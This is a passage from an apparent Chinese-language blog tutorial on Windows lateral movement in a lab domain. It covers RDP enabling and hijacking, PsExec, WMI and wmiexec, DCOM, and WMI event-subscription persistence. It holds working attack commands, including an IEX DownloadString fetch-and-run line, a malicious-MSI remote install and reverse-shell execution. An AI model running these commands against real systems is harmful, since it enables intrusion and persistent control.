src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/SID-RID-PC.png" alt="SID-RID-PC" tabindex="0" loading="lazy"><figcaption>SID-RID-PC</figcaption></figure><p>执行以下命令关闭UAC Remote Restrictions</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System&quot; /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>该命令与SC创建系统服务结合能进行远程UAC关闭(或许能成，但是写入的服务没有双引号指定路径)</p><h2 id="远程桌面利用" tabindex="-1"><a class="header-anchor" href="#远程桌面利用"><span>远程桌面利用</span></a></h2><p>远程桌面协议(RDP)，默认监听端口为3389，通过已获得的凭据进行代理登录远程主机并进行实时操控</p><p>缺点：可能导致对方用户强行下线，易被发现</p><h3 id="远程桌面的确定和开启" tabindex="-1"><a class="header-anchor" href="#远程桌面的确定和开启"><span>远程桌面的确定和开启</span></a></h3><p>执行以下命令来确定本机的远程桌面功能是否开启</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>reg query &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fDenyTSConnections</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/pc-rdp-close.png" alt="pc-rdp-close" tabindex="0" loading="lazy"><figcaption>pc-rdp-close</figcaption></figure><p>如图为0x1说明已禁用，0x0为开启，执行以下命令开启本地RDP服务</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>#开启服务</span></span>
<span class="line"><span>reg add &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span></span>
<span class="line"><span>#关闭“仅允许运行使用网络级别身份验证的远程桌面计算机连接”(鉴权)</span></span>
<span class="line"><span>reg add &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0 </span></span>
<span class="line"><span>#设置防火墙策略放行3389端口</span></span>
<span class="line"><span>netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/pc-rdp-open.png" alt="pc-rdp-open" tabindex="0" loading="lazy"><figcaption>pc-rdp-open</figcaption></figure><p>对远程主机，可使用WMI来开启远程桌面服务</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>wmic /Node:192.168.30.10 /User:Administrator /Password:uu2fu3o@admin RDTOGGLE WHERE ServerName=&quot;DC&quot; call SetAllowTSConnections 1</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/pc-wmi-dc-rdp-open.png" alt="pc-wmi-dc-rdp-open" tabindex="0" loading="lazy"><figcaption>pc-wmi-dc-rdp-open</figcaption></figure><p>需要指定远程主机的IP，主机名，用户凭据(这里用的域管用户)</p><h3 id="rdp-hijacking" tabindex="-1"><a class="header-anchor" href="#rdp-hijacking"><span>RDP Hijacking</span></a></h3><p>需要SYSTEM权限，并执行tscon命令</p><p>通过query user命令可以查看当前主机上存在哪些会话</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/pc-query-user.png" alt="pc-query-user" tabindex="0" loading="lazy"><figcaption>pc-query-user</figcaption></figure><p>通过msf提权到SYSTEM权限，使用以下命令</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>tscon id</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>即可切换到目标用户的远程会话，这是由于SYSTEM能够完全绕过用户权限的验证，不用输入密码即可切换到其他用户</p><h3 id="sharprdp" tabindex="-1"><a class="header-anchor" href="#sharprdp"><span>SharpRDP</span></a></h3><p>需要目标放行3389端口，以及用户凭据</p><p>需要注意的是，使用该方法进行连接之后，目标机器会进入锁屏状态</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/pc-sharprdp-cacl.png" alt="pc-sharprdp-cacl" tabindex="0" loading="lazy"><figcaption>pc-sharprdp-cacl</figcaption></figure><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/pc-cacl-sharprdp.png" alt="pc-cacl-sharprdp" tabindex="0" loading="lazy"><figcaption>pc-cacl-sharprdp</figcaption></figure><h2 id="psexec远控" tabindex="-1"><a class="header-anchor" href="#psexec远控"><span>PsExec远控</span></a></h2><p>根据官方对PsExec的介绍，该工具让你在其他系统上执行进程，并为控制台应用程序提供完整交互性，而无需手动安装客户端软件。 PsExec 最强大的用途包括在远程系统上启动交互式命令提示符，以及 IpConfig 等远程启用工具，否则无法显示有关远程系统的信息。</p><h4 id="工具原理" tabindex="-1"><a class="header-anchor" href="#工具原理"><span>工具原理</span></a></h4><p>通过SMB连接到目标服务器的Admin$共享(该共享默认开启)，并释放名为psexecsvc.exe的二进制文件，注册名为PSEXECSVC的服务，</p><p>当客户端执行命令时，会启动PSEXECSVC服务执行相应的命令并返回数据。运行结束后，该服务会被删除</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/psexec-smb-target.png" alt="psexec-smb-target" tabindex="0" loading="lazy"><figcaption>psexec-smb-target</figcaption></figure><p>整个过程的SMB对象如上图</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/psexec-pcapng.png" alt="psexec-pcapng" tabindex="0" loading="lazy"><figcaption>psexec-pcapng</figcaption></figure><p>上图为创建二进制文件的流量，关键部分进行了标记，该流量包可直接从<a href="http://uu2fu3o.com/PsExec-systeminfo.pcapng%E4%B8%8B%E8%BD%BD(%E5%9C%A8vps%E6%B2%A1%E5%88%B0%E6%9C%9F%E4%B9%8B%E5%89%8D)" target="_blank" rel="noopener noreferrer">http://uu2fu3o.com/PsExec-systeminfo.pcapng下载(在vps没到期之前)</a></p><h4 id="利用条件" tabindex="-1"><a class="header-anchor" href="#利用条件"><span>利用条件</span></a></h4><ul><li>远程主机开启ADMIN$共享</li><li>远程主机关闭防火墙或放行445端口</li></ul><p>该工具的命令参数</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/how_to_use_psexec.png" alt="how_to_use_psexec" tabindex="0" loading="lazy"><figcaption>how_to_use_psexec</figcaption></figure><p>执行以下命令，利用域管用户的凭据在目标机器上执行systeminfo命令，并回显到本地机器</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>PsExec.exe -accepteula \\\\192.168.30.10 -u hack\\Administrator -p uu2fu3o@admin -s sysetminfo</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/pc-to-dc-psexec-systeminfo.png" alt="pc-to-dc-psexec-systeminfo" tabindex="0" loading="lazy"><figcaption>pc-to-dc-psexec-systeminfo</figcaption></figure><p>该方法会产生大量的日志文件</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/dc-log-psexec.png" alt="dc-log-psexec" tabindex="0" loading="lazy"><figcaption>dc-log-psexec</figcaption></figure><p>能够看到来源于PC的登录验证，可自行搜索event id 为4648和4624的日志查看进程</p><h2 id="利用wmi进行横向移动" tabindex="-1"><a class="header-anchor" href="#利用wmi进行横向移动"><span>利用WMI进行横向移动</span></a></h2><h3 id="what-is-wmi" tabindex="-1"><a class="header-anchor" href="#what-is-wmi"><span>What is WMI</span></a></h3><p>根据官方的介绍</p><p>Windows Management Instrumentation (WMI) 是 Microsoft 对基于 Web 的企业管理 (WBEM) 的实现，WBEM 是一项业界倡议，用于为访问企业环境中的管理信息开发一项标准技术。 WMI 使用通用信息模型 (CIM) 行业标准来表示系统、应用程序、网络、设备和其他托管组件。 CIM 由分布式管理任务组 (<a href="https://www.dmtf.org/standards/wsman" target="_blank" rel="noopener noreferrer">DMTF</a>) 开发和维护。</p><p>从Windows 98开始，Windows操作系统都支持WMI。WMI是由一系列工具集组成的，可以在本地或者远程管理计算机系统。</p><h4 id="什么情况会用到wmi" tabindex="-1"><a class="header-anchor" href="#什么情况会用到wmi"><span>什么情况会用到WMI</span></a></h4><p>由于PsExec被大量的软件监测，且会产生大量的日志文件，越来越多的工具开始使用WMI进行横向移动</p><p>常规的利用方法分为两种</p><ul><li>利用WMI的类方法进行远程执行，例如：Win32_Process类中的Create方法能够在远程服务器创建进程，Win32_Product类中的Install方法可以在远程主机上安装恶意MSI文件</li><li>远程部署WMI时间订阅，在特定时间触发攻击</li></ul><h4 id="利用条件-1" tabindex="-1"><a class="header-anchor" href="#利用条件-1"><span>利用条件</span></a></h4><p>远程放行135端口(WMI的默认端口)</p><p>远程主机的WMI服务为开启状态(默认开启)</p><h3 id="常规利用方法" tabindex="-1"><a class="header-anchor" href="#常规利用方法"><span>常规利用方法</span></a></h3><p>在windows上通过wmic.exe和powershell cmdlet来使用WMI数据和执行WMI方法</p><ul><li><p>执行远程查询</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">wmic</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /node:192.168.30.10</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /user:Administrator</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /password:uu2fu3o@admin</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> process</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> brief</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#/node:指定远程主机 /user:指定用户名 /password：指定用户密码</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/pc-wmic-dc.png" alt="pc-wmic-dc" tabindex="0" loading="lazy"><figcaption>pc-wmic-dc</figcaption></figure></li><li><p>创建远程服务</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>wmic /node:192.168.30.10 /user:Administrator /password:uu2fu3o@admin process call create &quot;cmd.exe /c systeminfo &gt; \\\\192.168.30.20\\smb\\systeminfo.txt&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/pc-wmic-to-dc-systeminfo.png" alt="pc-wmic-to-dc-systeminfo" tabindex="0" loading="lazy"><figcaption>pc-wmic-to-dc-systeminfo</figcaption></figure></li></ul><p>​ 由于wmic执行系统命令并没有回显，所以可以通过写入共享文件夹的形式来读取</p><p>​ 该方法似乎并不能直接创建位于SMB共享文件夹中的shell进程(好像成功了一次，但后面并没有再成功接收到shell了)</p><ul><li><p>远程安装MSI文件</p><p>1.利用msf或其他工具生成恶意msi文件，并开启监听</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/msf-wmic-listening.png" alt="msf-wmic-listening" tabindex="0" loading="lazy"><figcaption>msf-wmic-listening</figcaption></figure></li></ul><p>​ 2.将恶意文件上传至跳板机已经搭建好的共享服务文件夹，通过调用Win32_Product.Install方法使远程主机安装恶意msi文件来获取 权限<img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/c-share.png" alt="	" loading="lazy"></p><p>​ 执行以下命令</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>wmic /node:192.168.30.10 /user:Administrator /password:uu2fu3o@admin product call install PackageLocation=&quot;\\\\192.168.30.20\\smb\\msf.msi&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/msi-pc-dc-wmic.png" alt="msi-pc-dc-wmic" tabindex="0" loading="lazy"><figcaption>msi-pc-dc-wmic</figcaption></figure><p>msf未能成功上线，原因为win server2012环境问题，不允许安装msi文件</p><h3 id="常见利用工具" tabindex="-1"><a class="header-anchor" href="#常见利用工具"><span>常见利用工具</span></a></h3><h4 id="wmiexec" tabindex="-1"><a class="header-anchor" href="#wmiexec"><span>wmiexec</span></a></h4><p>该工具位于impacket项目中，本身是一个py项目，可通过pyinstaller编译为exe文件，上传至windows使用，该工具可以通过提供的用户凭据开启一个半开式或全开的交互式shell，使用该工具需要同时开启135和445端口，其中445端口用于传输执行命令的回显</p><p>执行以下命令，使用wmiexec获取一个交互式shell</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">python wmiexec.py hack</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Administrator:uu2fu3o</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">@</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">admin</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">@</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">192.168</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.14.110</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#python wmiexec.py &lt;domain&gt;/&lt;username&gt;:&lt;password&gt;@&lt;IP&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/wmiexec-pc.png" alt="wmiexec-pc" tabindex="0" loading="lazy"><figcaption>wmiexec-pc</figcaption></figure><p>执行以下命令将该py项目编译为二进制程序在windows上进行运行</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>pyinstaller -F wmiexec.py</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>或者直接下载现成的exe文件进行使用</p><p><a href="https://github.com/maaaaz/impacket-examples-windows" target="_blank" rel="noopener noreferrer">https://github.com/maaaaz/impacket-examples-windows</a></p><p>使用效果与使用python进行连接效果相同</p><h4 id="invoke-wmicommand" tabindex="-1"><a class="header-anchor" href="#invoke-wmicommand"><span>Invoke-WmiCommand</span></a></h4><p>该项目源于powerspolit，可以通过powershell远程调用wmi来执行命令</p><p>将Invoke-WmiCommand.ps1上传至web站点(需要目标机器能够访问下载，最好是已控主机开启的http服务)</p><p>在已控主机上执行以下命令</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#远程加载ps脚本</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">IEX(New-Object</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Net.Webclient</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">).DownloadString(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&#39;http://192.168.14.110/Invoke-WmiCommand.ps1&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#指定远程系统用户名</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$User</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> = </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;hack\\Administrator&quot;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#指定远程系统用户密码</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$Password</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> = ConvertTo-SecureString -String </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;uu2fu3o@admin&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> -AsPlainText -Force</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#将用户名和密码整合，以便导入Credential</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$Cred</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$User</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$Password</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#指定远程主机的IP和要执行的命令</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$Remote</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> = Invoke-WmiCommand -Payload {</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">ipconfig}</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -Credential</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $Cred</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -ComputerName</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;192.168.30.10&quot;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#输出命令执行回显</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$Remote</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.PayloadOutput</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/powerspolit-dc-to-ps.png" alt="powerspolit-dc-to-ps" tabindex="0" loading="lazy"><figcaption>powerspolit-dc-to-ps</figcaption></figure><p>注意起始位置为PS</p><p>以及：</p><p><a href="https://github.com/rootclay/WMIHACKER" target="_blank" rel="noopener noreferrer">https://github.com/rootclay/WMIHACKER</a></p><h3 id="wmi订阅事件的利用" tabindex="-1"><a class="header-anchor" href="#wmi订阅事件的利用"><span>WMI订阅事件的利用</span></a></h3><p>远程部署WMI事件订阅需要在远程系统上具有管理员权限，WMI事件订阅用到的两个组件event,consumer</p><ul><li><p>Event Filter:</p><p>WQL事件查询，用于将事件筛选为特定条件集，例如刚刚在终端上派生的Outlook.exe。WQL查询可能类似于</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>Select * From __InstanceCreationEvent Within 5 </span></span>
<span class="line"><span>Where TargetInstance Isa “Win32_Process” AND TargetInstance.Name = &quot;Outlook.exe&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>类似于查询某个进程的创建或某个命令的执行，当查询到对应进程创建时，就会调用consumer</p></li><li><p>事件消费者（Event Consumer）：这是事件触发时我们想要进行的特定操作，从红队交付来看，我们感兴趣的两个类是<code>ActiveScriptEventConsumer</code>和<code>CommandLineEventConsumer</code>。其中，<code>ActiveScriptEventConsumer</code>允许执行脚本代码（来自JScript或VBScript引擎），而<code>CommandLineEventConsumer</code>类则允许运行任意命令。我个人比较倾向于<code>ActiveScriptEventConsumer</code>类，这样就可以避免触及LOLBin的雷区。</p><p><a href="https://www.anquanke.com/post/id/223232" target="_blank" rel="noopener noreferrer">https://www.anquanke.com/post/id/223232</a></p></li></ul><p>筛选器与消费者总是绑定在一起的，当筛选器轮询到对应进程启动时，将会调用消费者执行任意命令，或是执行脚本文件等</p><p>不难看出该方法更适用于权限持久化，但是，我们同样可以进行无文件的横向移动</p><h4 id="sharp-wmievent" tabindex="-1"><a class="header-anchor" href="#sharp-wmievent"><span>Sharp_WMIEvent</span></a></h4><p>项目地址：<a href="https://github.com/wh0amitz/Sharp-WMIEvent" target="_blank" rel="noopener noreferrer">https://github.com/wh0amitz/Sharp-WMIEvent</a></p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Sharp-WMIEvent</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -Trigger</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Interval</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -IntervalPeriod</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 60</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -Computername</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 192.168.30.10</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -Domain</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> hack.com</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -Username</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Administrator</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -Password</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> uu2fu3o@admin</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -Command</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;cmd.exe /c </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">192.168.30.20\\smb\\Sharp-WMIEvent.exe&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#Sharp-WMIEvent -Trigger Interval -IntervalPeriod 60 -Command &quot;cmd.exe /c \\\\IP\\evilsmb\\reverse_tcp.exe&quot; -FilterName &lt;Filter Name&gt; -ConsumerName &lt;Consumer Name&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>在目标服务器上创建一个永久性的WMI订阅事件，每60秒执行一次</p><h2 id="利用dcom" tabindex="-1"><a class="header-anchor" href="#利用dcom"><span>利用DCOM</span></a></h2><p>DCOM（分布式组件对象模型）是微软基于组件对象模型（COM）的一系列概念和程序接口，它支持不同的两台机器上的组件间的通信，不论它们是运行在局域网、广域网、还是Internet上。利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求。</p><p>DCOM 使用远程过程调用（RPC）技术将组件对象模型（COM）的功能扩展到本地计算机之外，因此，在远程系统上托管COM服务器端的软件（通常在DLL或exe中）可以通过RPC向客户端公开其方法</p><p>优点：在远程主机上执行的进程会是托管COM服务端的软件，增加了隐蔽性</p><h3 id="本地dcom测试" tabindex="-1"><a class="header-anchor" href="#本地dcom测试"><span>本地DCOM测试</span></a></h3><p>执行以下命令，查看本地DCOM程序列表</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>Get-CimInstance Win32_DCOMApplication</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/dcom-dc-local.png" alt="dcom-dc-local" tabindex="0" loading="lazy"><figcaption>dcom-dc-local</figcaption></figure><ul><li>Get-CimInstance这个命令只有在Powershell3.0以上的版本中才能使用(Winserver 2012往上的版本)</li></ul><p>在win7或winerver2008等较低版本中默认安装powershell2.0,可替换为以下命令</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>Get-WmiObject -Namespace ROOT\\CIMV2 -Class Win32_DCOMApplication</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/pc-local-dcom-find.png" alt="pc-local-dcom-find" tabindex="0" loading="lazy"><figcaption>pc-local-dcom-find</figcaption></figure><h4 id="利用dcom在本地执行命令" tabindex="-1"><a class="header-anchor" href="#利用dcom在本地执行命令"><span>利用DCOM在本地执行命令</span></a></h4><ul><li><p>利用MMC Application Class（MMC20.Application）</p><p>执行以下命令查找本地的MMC</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" 